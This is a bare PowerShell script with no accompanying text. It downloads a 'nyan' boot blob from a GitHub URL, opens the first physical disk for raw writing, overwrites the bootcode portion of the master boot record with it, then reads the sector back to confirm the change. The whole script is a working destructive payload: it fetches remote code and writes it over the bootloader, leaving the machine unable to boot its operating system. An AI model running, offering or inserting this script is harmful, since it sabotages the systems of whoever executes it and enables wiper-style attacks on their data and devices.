# download the remote MBR file (binary)
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing

# read bytes from downloaded file
$bootBytes = [System.IO.File]::ReadAllBytes("$env:TEMP\nyan.mbr")

if ($bootBytes.Length -lt 446) {
    throw "Downloaded boot blob is too small ($($bootBytes.Length) bytes). Need at least 446 bytes."
}

# open physical drive 0
$fs = New-Object System.IO.FileStream(
    "\\.\PhysicalDrive0",
    [System.IO.FileMode]::Open,
    [System.IO.FileAccess]::ReadWrite,
    [System.IO.FileShare]::ReadWrite
)

try {
    # read current MBR (512 bytes)
    $sector = New-Object byte[] 512
    $bytesRead = $fs.Read($sector, 0, 512)
    if ($bytesRead -ne 512) {
        throw "Failed to read full 512-byte MBR (read $bytesRead bytes)."
    }

    # copy first 446 bytes of downloaded bootcode into the sector buffer
    [Array]::Copy($bootBytes, 0, $sector, 0, 446)

    # write modified MBR back to disk
    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $fs.Write($sector, 0, 512)
    $fs.Flush()
}
finally {
    $fs.Close()
}

# verify by re-reading the sector and printing the signature and some head bytes
$fs2 = New-Object System.IO.FileStream(
    "\\.\PhysicalDrive0",
    [System.IO.FileMode]::Open,
    [System.IO.FileAccess]::Read,
    [System.IO.FileShare]::ReadWrite
)
try {
    $verify = New-Object byte[] 512
    $fs2.Read($verify,0,512) | Out-Null
} finally {
    $fs2.Close()
}

"Signature bytes (hex): {0:X2} {1:X2}" -f $verify[510], $verify[511]
"First 16 bytes of MBR (hex): " + ($verify[0..15] | ForEach-Object { '{0:X2}' -f $_ } ) -join ' '
